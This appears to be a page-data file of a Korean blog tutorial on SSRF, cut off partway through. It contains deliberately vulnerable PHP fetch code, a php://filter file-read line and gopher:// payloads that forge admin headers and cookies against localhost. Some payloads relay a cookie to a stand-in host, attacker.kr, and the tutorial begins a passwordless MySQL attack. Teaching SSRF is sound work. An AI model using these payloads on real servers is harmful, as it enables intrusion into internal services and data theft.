{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/we_application_SSRF/",
    "result": {"data":{"cur":{"id":"ac0a8ece-b243-5099-8ec2-73ee818ee536","html":"<h1 id=\"ssrf-overview\" style=\"position:relative;\"><a href=\"#ssrf-overview\" aria-label=\"ssrf overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF Overview</h1>\n<ul>\n<li>웹 어플리케이션에서 요청이 보내질 떄 웹 어플리케이션이 작동하고 있는 서버 내부의 포트, 서버와 연결된 내부망에 요청을 보낼 수 가 있죠</li>\n<li>server-side에서 변조된 요청, 의도하지 않은 서버로 요청을 보내어 별도의 인증 없이 내부방 안에서 요청되는 데이터를 조작하는 공격 기법입니다.</li>\n<li>즉, 공격자가 의도한 서버로 요청을 가게 하는 취약점으로 CSRF 와 유사한 형태지만 클라이언트가 아닌 서버에 직접 영향을 줄 수 있다는 점에서 차이가 있습니다.</li>\n</ul>\n<p><strong>다른 공격 기법과 연계</strong></p>\n<ul>\n<li>다른 취약점과 연계에서 사용할 경우 RCE로 이어질 수 있기 때문에 파급력이 큽니다.\n<ul>\n<li>XXE 취약점 + SSRF 취약점</li>\n<li>SSRF 취약점 + CRLF Injection 취약점</li>\n<li>SSRF 취약점 + Redis-Server 연계 취약점</li>\n<li>SSRF + MongoDB 연계 취약점</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"php-ssrf-example\" style=\"position:relative;\"><a href=\"#php-ssrf-example\" aria-label=\"php ssrf example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SSRF Example</h2>\n<ul>\n<li>php curl API가 설정된 대상 애플리케이션 환경에서 GET 메서드의 url 쿼리를 통해 SSRF 공격이 수행되는 예시입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token variable\">$c_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_TIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>내부망에 접근이 가능한 영역에 접속</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=http://localhost/api/admin</span></code></pre></div>\n<ul>\n<li>내부망 서버에 접속</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=http://localhost:8000/</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">Gopher</code> 를 활용한 TCP 연결후 POST 요청</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=gopher://localhost:8000/_POST%20HTTP/1.1%0d%0a</span></code></pre></div>\n<h1 id=\"ssrf-exploit-technique\" style=\"position:relative;\"><a href=\"#ssrf-exploit-technique\" aria-label=\"ssrf exploit technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF Exploit Technique</h1>\n<h2 id=\"ssrf-공격시-사용-가능한-protocol-종류\" style=\"position:relative;\"><a href=\"#ssrf-%EA%B3%B5%EA%B2%A9%EC%8B%9C-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-protocol-%EC%A2%85%EB%A5%98\" aria-label=\"ssrf 공격시 사용 가능한 protocol 종류 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF 공격시 사용 가능한 Protocol 종류</h2>\n<ul>\n<li><code class=\"language-text\">http://</code> : HTTP 접속 용</li>\n<li><code class=\"language-text\">ftp://</code> : ftp 접속 용</li>\n<li><code class=\"language-text\">dict://</code> : RFC 2229 서버 액세스 용</li>\n<li><code class=\"language-text\">sftp://</code> : sftp 접속 용</li>\n<li><code class=\"language-text\">tftp://</code> : tftp 접속 용</li>\n<li><code class=\"language-text\">ldap://</code> : JAVA ES 솔루션 Directory Server 용</li>\n<li><code class=\"language-text\">gopher://</code> : TCP 연결용</li>\n<li><code class=\"language-text\">netdoc://</code> : JDK9 버전 이하에서 사용, URL을 통해 외부적 네트워크 문서 참조용</li>\n<li><code class=\"language-text\">file://</code> : 파일 읽기용</li>\n</ul>\n<h3 id=\"php-wrapper-only-php\" style=\"position:relative;\"><a href=\"#php-wrapper-only-php\" aria-label=\"php wrapper only php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Wrapper (Only PHP)</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># PHP://filter/convert.base64-encode/resource=파일 경로</span></code></pre></div>\n<h3 id=\"gopher-protocol을-활용한-http-패킷-전송\" style=\"position:relative;\"><a href=\"#gopher-protocol%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-http-%ED%8C%A8%ED%82%B7-%EC%A0%84%EC%86%A1\" aria-label=\"gopher protocol을 활용한 http 패킷 전송 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gopher Protocol을 활용한 HTTP 패킷 전송</h3>\n<ul>\n<li>HTTP 패킷을 그대로 만들어서 전송이 가능합니다.</li>\n<li>구조는 다음과 같은 형태로 구성하여 전송을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//&lt;proxy-server>/_GET%20http://&lt;attacker.kr:80>/EX%20HTTP/1.1%0d%0a</span>\ngopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//&lt;proxy-server>/_POST%20http://&lt;attacker.kr:80>/EX%20HTTP/1.1%0d%0aContent-Length:21%0d%0aCookie:%20c_s=1%0d%0adata={a:1}</span></code></pre></div>\n<p><strong>Gopher HTTP (POST)</strong></p>\n<ul>\n<li>정상적인 HTTP POST 요청 패킷</li>\n<li><code class=\"language-text\">\\r\\n</code> 을 URL Encoding 하면 %0d%0a 사용됩니다.</li>\n<li><code class=\"language-text\">Content-Length</code> 헤더가 존재해야 POST Body 데이터가 전송이 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>data <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span>application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span><span class=\"token constant\">POST_BODY</span> 길이\\r\\n\n\\r\\n\n<span class=\"token constant\">POST_BODY</span></code></pre></div>\n<ul>\n<li>Gopher 프로토콜을 활용하여 POST 패킷을 전송할 경우</li>\n<li>Gopher를 사용할 때 첫 한바이트는 건너 뛰고 사용해야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1/ _POST%20/data%20HTTP/1.1%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:%209%0d%0a%0d%0aPOST_BODY</span></code></pre></div>\n<p><strong>Gopher HTTP (Header)</strong></p>\n<ul>\n<li>만약 다음 PHP 코드로 구성되어 있을 경우 다음과 같이 Gopher를 활용하여 통과할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_XXXX'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"True\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\n<span class=\"token constant\">XXXX</span><span class=\"token punctuation\">:</span><span class=\"token number\">1234</span>\\r\\n\\r\\n</code></pre></div>\n<ul>\n<li>위의 예시를 통해 다음 조건이 걸려 있다면 다음과 같이 구성을 하면됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_ADMIN'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span>\n<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span>\n<span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span></code></pre></div>\n<ul>\n<li>공격 요청 패킷 정렬</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:80/_POST /api/admin.php HTTP/1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>\\r\\n\n<span class=\"token constant\">ADMIN</span><span class=\"token punctuation\">:</span> admin\\r\\n\nCookie<span class=\"token punctuation\">:</span> admin<span class=\"token operator\">=</span>admin<span class=\"token punctuation\">;</span>\\r\\n\nConnection<span class=\"token punctuation\">:</span> close\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">11</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\n\\r\\n\n\\r\\n\nadmin<span class=\"token operator\">=</span>admin</code></pre></div>\n<ul>\n<li>gopher 프로토콜 포맷 정렬</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:80/_POST%20/api/admin.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aADMIN:%20admin%0d%0aCookie:%20admin=admin;%0d%0aConnection:%20close%0d%0aContent-Length:%2011%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0a%0d%0aadmin=admin</span></code></pre></div>\n<h3 id=\"gopher-프로토콜-활용-데이터베이스-접근\" style=\"position:relative;\"><a href=\"#gopher-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C-%ED%99%9C%EC%9A%A9-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EC%A0%91%EA%B7%BC\" aria-label=\"gopher 프로토콜 활용 데이터베이스 접근 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gopher 프로토콜 활용 데이터베이스 접근</h3>\n<p><strong>취약한 대상 애플리케이션 소스 코드</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'db_perpus'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$source</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Do Not Url..'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$c_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_TIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>gopher ssrf database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>gopher ssrf database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>?source<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>source<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$result</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>대상 애플리케이션에서 <code class=\"language-text\">mysqli_connect</code> 를 통해 <code class=\"language-text\">database host</code>, <code class=\"language-text\">database id</code>, <code class=\"language-text\">pw</code>, <code class=\"language-text\">database name</code> 으로 구성되어 있습니다.</li>\n<li>현재 설정된 데이터를 확인해보면 패스워드가 설정되지 않고 운영이 되고 있습니다.</li>\n<li>gopher를 활용하기에 앞서 해당 애플리케이션의 데이터베이스 버전 정보와 서버 환경의 데이터를 수집을 진행합니다.</li>\n<li>mysql 을 사용하기 때문에, 실제 같은 환경을 구축한 후 mysql를 사용하여 로그인을 진행하면서 패킷을 수집합니다. 이때 대상 환경이 패스워드가 설정되어 있지 않기 때문에 로그인을 하지 않은 상태에서 id,host 정보만으로 접근을 시도합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">mysql <span class=\"token operator\">-</span>h <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token operator\">-</span>u root</code></pre></div>\n<ul>\n<li>연결을 진행한 후 패킷을 수집시 raw 데이터를 파싱해서 저장합니다.</li>\n</ul>\n<p><span\n      